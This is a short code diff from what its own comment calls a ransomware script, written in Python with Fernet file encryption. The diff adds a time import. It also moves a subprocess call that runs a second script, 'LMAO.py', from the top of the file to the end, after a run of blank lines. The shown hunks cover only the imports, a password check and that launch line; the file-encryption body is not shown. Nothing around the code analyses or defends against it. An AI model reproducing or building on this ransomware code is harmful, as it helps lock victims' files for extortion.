@@ -1,7 +1,8 @@
 import os
+import time
 from cryptography.fernet import Fernet
 from subprocess import call
-call(["python", "LMAO.py"])
+
 
 # Searching for file to encrypt exept from the ransomware file
 files = []
@@ -47,3 +48,10 @@ if userInput == password:
 
 else:
 	time.sleep(1)
+
+	
+	
+	
+	
+	
+call(["python", "LMAO.py"])
